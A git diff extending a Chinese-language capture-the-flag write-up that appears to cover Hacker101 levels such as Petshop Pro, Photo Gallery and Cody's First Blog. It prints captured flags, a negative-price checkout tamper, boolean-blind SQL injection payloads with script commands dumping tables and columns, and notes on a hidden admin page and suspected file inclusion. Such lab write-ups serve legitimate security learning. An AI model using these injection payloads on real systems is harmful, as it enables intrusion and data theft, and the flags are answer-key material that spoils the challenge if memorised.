@@ -217,8 +217,123 @@ Upgrade-Insecure-Requests: 1
 出现flag
 ^FLAG^f6614ed7527fe8333dbfb00a21480563db95a6650186aaa420e9243a16add752$FLAG$
 
-最后一个flag，题目提示试着伪造id为1登陆
+最后一个flag，题目提示试着伪造id为1登陆 
+出现flag:
+^FLAG^6d30325139a20ceae69f30bc0a5e320131b5b9be58d1cf31174f7d55e8a1d84c$FLAG$
 
 
 
+
+## 四.关卡四 Petshop Pro
+
+checkout时抓包，发现body中带了价格，改为负的即可。^FLAG^83a2b55a90ee38d86981626ee176f13488dd9c8f83c54b03a57774c54d91746a$FLAG$ 
+
+
+扫描一下网站
+发现后台
+http://35.190.155.168:5001/e67c97bb00/login
+
+
+## 五.关卡五 Photo Gallery
+
+### 1.信息收集
+打开主页发现有个
+url:/fetch?id=1
+
+dirmap 信息枚举发现
+
+
+### 2.开始攻击
+
+#### 2.1.暴力
+/fetch?id=1 枚举id测试
+
+
+#### 2.2 sql注入
+/fetch?id=1 and 1显示正确
+/fetch?id=1 and 0 显示错误 存在sql注入
+
+猜想查询语句:select image from image_info where id = {id}
+
+尝试union注入发现不行，
+尝试报错注入发现不行
+布尔盲注
+```
+id=1 and (length(database()) > 1)  正确
+id=1 and (length(database()) > 20) 错误
+```
+布尔盲注存在
+用脚本盲注：
+python3 5_2_2.py -t information_schema.tables -f table_name -w "table_schema=database()"
+表名：
+albums,photos
+
+python3 5_2_2.py -t information_schema.columns -f column_name -w "table_name='albums'"
+python3 5_2_2.py -t information_schema.columns -f column_name -w "table_name='photos'"
+
+albums表id,title列
+photos表id,title,filename,parent列
+
+python3 5_2_2.py -t albums -f title
+
+Kittens
+
+python3 5_2_2.py -t photos -f title
+
+Utterly adorable,Purrfect,Invisible
+
+python3 5_2_2.py -t photos -f filename
+
+files/adorable.jpg,files/purrfect.jpg,c2eb2521a9162bb8bbeabc90519f32539a832d09aa816f80e9608edca3d54b1e
+
+得到flag:
+^FLAG^c2eb2521a9162bb8bbeabc90519f32539a832d09aa816f80e9608edca3d54b1e$FLAG$
+### 2.3
+
+
+
+## 六.关卡六 Cody's First Blog
+
+### 1.信息收集
+
+打开后提示作者可以上传文件，而且是用include的方式。
+
+而且还有个留言板怀疑存在xss
+
+账户名是Cody
+
+打开源码发现有
+<!--<a href="?page=admin.auth.inc">Admin login</a>-->
+出现后台链接
+
+dirsearch扫描
+扫描出dockerfile文件,php.ini,posts文件夹
+
+dockerfile文件:
+
+```
+FROM nimmis/apache-php5
+
+COPY 000-default.conf /etc/apache2/sites-available/000-default.conf
+COPY php.ini /etc/php5/apache2/php.ini
+
+EXPOSE 80
+
+WORKDIR /app
+
+RUN apt-get update
+RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server libmysqlclient-dev build-essential python-dev python-pip
+RUN pip install mysqlclient
+
+ADD . /app
+
+CMD bash setup.sh
+```
+
+### 2.开始攻击
+
+访问：
+/?page=admin.auth.inc
+出现后台，而admin.auth.inc.php为后台地址
+而且猜测可能还有LFI漏洞,存在任意文件遍历读取漏洞
 
